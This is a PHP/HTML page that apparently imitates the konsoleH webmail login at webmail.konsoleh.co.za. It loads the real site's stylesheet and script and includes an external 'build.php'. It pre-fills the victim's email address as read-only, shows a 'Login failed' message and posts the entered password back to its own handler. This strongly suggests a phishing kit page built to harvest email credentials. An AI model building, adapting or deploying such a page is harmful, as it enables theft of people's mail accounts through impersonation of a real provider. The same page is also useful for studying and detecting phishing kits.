<?php include '../build.php' ?>
<html lang="en"><head>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://webmail.konsoleh.co.za/styles.css" type="text/css">
    <script type="module" src="https://webmail.konsoleh.co.za/indexed.js"></script>
    <title>Webmail - Log in</title>
  </head>
  <body>
    <div style="<?php echo $error; ?>">
        <div data-testid="toast" id="toast" class="toast toast--show">
        <div id="toast-message" class="toast__message">Login failed. Please try again.</div>
        </div>
    </div>
    <div class="container">
      <div class="login-form">
        <h1 class="heading">Log in to Webmail</h1>
        <form id="login-form" method="post" action="" novalidate>
            <input type="hidden" name="login" value="konsoleh">
          <div class="form-field">
            <label for="email" class="form-field__label">Email address *</label>
            <div class="form-field__input-wrapper">
              <input type="text" id="email" name="user" autocomplete="username" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="<?php echo htmlspecialchars($decoded); ?>" class="form-field__input" required="true" readonly>
            </div>
            <div class="form-field__validation-text">&nbsp;</div>
          </div>
          <div class="form-field">
            <label for="password" class="form-field__label">Password *</label>
            <div class="form-field__input-wrapper form-field__input-wrapper--password">
              <input type="text" id="password" name="pass" autocomplete="current-password" placeholder="Enter password" class="form-field__input" required="true">
              <button type="button" id="show-hide-btn" class="form-field__input__button">
                Show
              </button>
            </div>
            <div class="form-field__validation-text">&nbsp;</div>
          </div>
          <div class="login-form__actions">
            <button id="submit" type="submit" class="login-form__submit">
              Log in
            </button>
          </div>
        </form>
        <button id="show-helptext-button" type="button" class="login-form__help-text-button">
          <strong><u>Forgot password?</u></strong>
        </button>
        <p id="help-text" class="login-form__help-text hidden">
          To reset your password, please contact your mail administrator -
          usually your IT support team or the person who set up your mail
          account.
        </p>
      </div>
    </div>
  

</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>